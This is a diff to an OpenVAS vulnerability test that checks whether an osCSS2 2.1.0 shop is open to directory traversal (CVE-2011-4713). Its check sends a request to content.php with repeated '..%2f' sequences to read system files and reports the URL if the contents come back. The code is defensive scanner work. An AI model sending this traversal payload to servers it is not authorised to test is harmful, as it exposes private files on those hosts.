@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_oscss_id_param_dir_trav_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
+# $Id: secpod_oscss_id_param_dir_trav_vuln.nasl 11188 2018-09-03 11:04:26Z cfischer $
 #
 # osCSS2 '_ID' parameter Directory Traversal Vulnerability
 #
@@ -24,44 +24,48 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation could allow attackers to perform directory traversal
-  attacks and read arbitrary files on the affected application.
-  Impact Level: Application";
-tag_affected = "osCSS2 version 2.1.0";
-tag_insight = "The flaw is due to input validation error in 'id' parameter to
-  'shopping_cart.php' and 'content.php', which allows attackers to read
-  arbitrary files via a ../(dot dot) sequences.";
-tag_solution = "Upgrade to osCSS2 svn branche 2.1.0 stable version or later
-  For updates refer to http://download.oscss.org/";
-tag_summary = "This host is running osCSS2 and is to prone directory traversal
-  vulnerability.";
-
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902763");
-  script_version("$Revision: 9351 $");
+  script_version("$Revision: 11188 $");
+  script_cve_id("CVE-2011-4713");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-03 13:04:26 +0200 (Mon, 03 Sep 2018) $");
   script_tag(name:"creation_date", value:"2011-12-12 03:17:35 +0530 (Mon, 12 Dec 2011)");
   script_name("osCSS2 '_ID' parameter Directory Traversal Vulnerability");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/46741");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18099/");
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/520421");
-  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Nov/117");
-  script_xref(name : "URL" , value : "http://www.rul3z.de/advisories/SSCHADV2011-034.txt");
-
-  script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 SecPod");
   script_family("Web application abuses");
   script_dependencies("secpod_oscss_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+
+  script_xref(name:"URL", value:"http://secunia.com/advisories/46741");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18099/");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520421");
+  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Nov/117");
+  script_xref(name:"URL", value:"http://www.rul3z.de/advisories/SSCHADV2011-034.txt");
+
+  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform directory traversal
+  attacks and read arbitrary files on the affected application.
+
+  Impact Level: Application");
+
+  script_tag(name:"affected", value:"osCSS2 version 2.1.0");
+
+  script_tag(name:"insight", value:"The flaw is due to input validation error in 'id' parameter to
+  'shopping_cart.php' and 'content.php', which allows attackers to read
+  arbitrary files via a ../(dot dot) sequences.");
+
+  script_tag(name:"solution", value:"Upgrade to osCSS2 svn branche 2.1.0 stable version or later
+  For updates refer to http://download.oscss.org/");
+
+  script_tag(name:"summary", value:"This host is running osCSS2 and is to prone directory traversal
+  vulnerability.");
+
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"remote_vul");
+
   exit(0);
 }
 
@@ -71,34 +75,24 @@ include("host_details.inc");
 include("version_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
 port = get_http_port(default:80);
-if(!port){
-  exit(0);
-}
 
-## Check Host Supports PHP
-if(!can_host_php(port:port)){
-  exit(0);
-}
-
-## Get oscss Installed Location
 if(!dir = get_dir_from_kb(port:port, app:"osCSS")){
   exit(0);
 }
 
-## traversal_files() function Returns Dictionary (i.e key value pair)
-## Get Content to be checked and file to be check
+if(dir == "/") dir = "";
+
 files = traversal_files();
 
-foreach file (keys(files))
-{
-  ## Construct directory traversal attack
-  url = string(dir, "/content.php?_ID=", crap(data:"..%2f",length:3*15),
-               files[file]);
+foreach file (keys(files)){
+  url = string(dir, "/content.php?_ID=", crap(data:"..%2f", length:3*15), files[file]);
 
-  ## Confirm exploit worked properly or not
-  if(http_vuln_check(port:port, url:url,pattern:file)){
-    security_message(port:port);
+  if(http_vuln_check(port:port, url:url, pattern:file)){
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
+    exit(0);
   }
 }
+
+exit(99);
